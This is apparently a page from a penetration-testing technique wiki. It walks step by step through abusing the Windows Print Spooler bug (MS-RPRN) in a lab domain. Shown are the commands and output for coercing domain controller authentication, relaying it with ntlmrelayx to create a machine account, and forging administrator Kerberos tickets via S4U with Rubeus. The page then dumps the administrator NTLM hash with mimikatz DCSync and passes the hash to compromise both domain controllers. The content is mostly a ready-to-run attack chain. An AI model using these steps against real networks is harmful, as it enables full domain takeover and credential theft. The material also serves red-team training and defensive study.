---
title : "PrinterBug (MS-RPRN abuse)"
# pre : ' '
description : "Triggers RPC call using SpoolService bug."
date : 2023-05-03T20:08:19+02:00
# hidden : true
# draft : true
weight : 70
tags : ['Techniques', 'Active Directory', 'Coercer']
---

---

Triggers RPC call using SpoolService bug.

## Installation

Make sure you have installed Impacket and download [printerbug.py](https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py).

## Step 1 - Is printspooler enabled?

```plain
$ cme smb 10.10.20.52 -u crypt0rr -p Welkom1234 -M spooler
SMB         10.10.20.52     445    DC02             [*] Windows 10.0 Build 17763 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.20.52     445    DC02             [+] offsec.nl\crypt0rr:Welkom1234 
SPOOLER     10.10.20.52     445    DC02             Spooler service enabled
```

## Step 2 - Start ntlmrelayx.py

The target (`-t`) should be another Domain Controller than the DC used for triggering.

```plain
$ sudo ntlmrelayx.py -t ldaps://dc03.offsec.nl --delegate-access --remove-mic -smb2support --no-validate-privs
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
```

### Step 3 - Trigger Printerbug

Authentication `@10.10.20.52` is the DC checked in step 1. The system at `10.10.20.10` is the IP running `ntlmrelayx.py` from step 2.

```plain
$ python3 printerbug.py 'offsec.nl'/'crypt0rr':'Welkom1234'@10.10.20.52 10.10.20.10
[*] Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Attempting to trigger authentication via rprn RPC at 10.10.20.52
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked
```

If all goes as expected the following will be performed by `ntlmrelayx.py`.

```plain
[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 10.10.20.10, attacking target ldaps://dc03.offsec.nl
[*] Authenticating against ldaps://dc03.offsec.nl as OFFSEC/DC02$ SUCCEED
[*] Assuming relayed user has privileges to escalate a user via ACL attack
[-] Cannot perform ACL escalation because we do not have create user privileges. Specify a user to assign privileges to with --escalate-user
[*] Attempting to create computer in: CN=Computers,DC=offsec,DC=nl
[*] SMBD-Thread-7: Connection from 10.10.20.10 controlled, but there are no more targets left!
[*] Adding new computer with username: JDIWKAKA$ and password: pU^Jj391_X6>b result: OK
```

A computer account `JDIWKAKA$` with password `pU^Jj391_X6>b` is added to the domain.

### Step 4 - Calculate RC4 from Password

```plain
PS Z:\> .\Rubeus.exe hash /password:pU^Jj391_X6>b

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : pU^Jj391_X6>b
[*]       rc4_hmac             : CC7EC46213E1EB105FFFC97F34AEAF64

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```

### Step 5 - Requesting TGT

```plain
PS Z:> .\Rubeus.exe asktgt /user:JDIWKAKA$ /domain:offsec.nl /rc4:CC7EC46213E1EB105FFFC97F34AEAF64

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using rc4_hmac hash: CC7EC46213E1EB105FFFC97F34AEAF64
[*] Building AS-REQ (w/ preauth) for: 'offsec.nl\JDIWKAKA$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s

  ServiceName              :  krbtgt/offsec.nl
  ServiceRealm             :  OFFSEC.NL
  UserName                 :  JDIWKAKA$
  UserRealm                :  OFFSEC.NL
  StartTime                :  02/05/2023 06:12:45
  EndTime                  :  02/05/2023 16:12:45
  RenewTill                :  09/05/2023 06:12:45
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  nmas9lybWx+91337H9Cw==
  ASREP (key)              :  94D178D478713374203D632D7B613B7
```

### Step 6 - Impersonate CIFS/LDAP Tickets

#### LDAP

```plain
PS Z:\> .\Rubeus.exe s4u /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s /impersonateuser:administrator /msdsspn:LDAP/dc03.offsec.nl /dc:10.10.20.53 /ptt

[*] Action: S4U

[*] Using domain controller: 10.10.20.53
[*] Building S4U2self request for: 'JDIWKAKA$@OFFSEC.NL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'JDIWKAKA$@OFFSEC.NL'
[*] base64(ticket.kirbi):

      doIGxjCCBsKgAwIBB[...]1ZKWVJUJA==

[*] Impersonating user 'administrator' to target SPN 'LDAP/dc03.offsec.nl'
[*] Using domain controller: 10.10.20.53
[*] Building S4U2proxy request for service: 'LDAP/dc03.offsec.nl'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'LDAP/dc03.offsec.nl':

      doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s

[+] Ticket successfully imported!
```

#### CIFS

```plain
PS Z:\> .\Rubeus.exe s4u /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s /impersonateuser:administrator /msdsspn:CIFS/dc03.offsec.nl /dc:10.10.20.53 /ptt

[*] Action: S4U

[*] Using domain controller: 10.10.20.53
[*] Building S4U2self request for: 'JDIWKAKA$@OFFSEC.NL'
[*] Sending S4U2self request
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'JDIWKAKA$@OFFSEC.NL'
[*] base64(ticket.kirbi):

      doIGxjCCBsKgAwIBB[...]1ZKWVJUJA==

[*] Impersonating user 'administrator' to target SPN 'CIFS/dc03.offsec.nl'
[*] Using domain controller: 10.10.20.53
[*] Building S4U2proxy request for service: 'CIFS/dc03.offsec.nl'
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/dc03.offsec.nl':

      doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s
      
[+] Ticket successfully imported!
```

#### Check Kerberos Tray

```plain
PS Z:\> klist

Current LogonId is 0:0x51ac9

Cached Tickets: (2)

#0>     Client: administrator @ OFFSEC.NL
        Server: LDAP/dc03.offsec.nl @ OFFSEC.NL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 5/2/2023 6:30:26 (local)
        End Time:   5/2/2023 16:12:45 (local)
        Renew Time: 5/9/2023 6:12:45 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

#1>     Client: administrator @ OFFSEC.NL
        Server: CIFS/dc03.offsec.nl @ OFFSEC.NL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 5/2/2023 6:27:25 (local)
        End Time:   5/2/2023 16:12:45 (local)
        Renew Time: 5/9/2023 6:12:45 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

To validate if the CIFS is working with elevated (remote Administrator privileges) on the target machine, for example use the following `dir \\WIN10-TARGET.offsec.nl\c$`.

### Step 7 - Dump NTLM hash

```plain
PS Z:\> .\mimikatz.exe

mimikatz # lsadump::dcsync /domain:offsec.nl /user:administrator@offsec.nl /dc:dc03.offsec.nl
[DC] 'offsec.nl' will be the domain
[DC] 'dc03.offsec.nl' will be the DC server
[DC] 'administrator@offsec.nl' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : administrator (SVC)

** SAM ACCOUNT **

SAM Username         : administrator
User Principal Name  : administrator@offsec.nl
[...]
Credentials:
  Hash NTLM: 97f2592347d8fbe42be381726ff9ea83
[...]
```

### Step 8 - Pass the Hash

```plain
$ cme smb 10.10.20.52-53 -u administrator -H 97f2592347d8fbe42be381726ff9ea83
SMB         10.10.20.52     445    DC02             [*] Windows 10.0 Build 17763 x64 (name:DC02) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.20.53     445    DC03             [*] Windows 10.0 Build 20348 x64 (name:DC03) (domain:offsec.nl) (signing:True) (SMBv1:False)
SMB         10.10.20.52     445    DC02             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
SMB         10.10.20.53     445    DC03             [+] offsec.nl\administrator:97f2592347d8fbe42be381726ff9ea83 (Pwn3d!)
```

## URL list

- [Github.com - printerbug.py](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
- [Thehacker.recipes - MS-RPRN abuse (PrinterBug)](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-rprn)
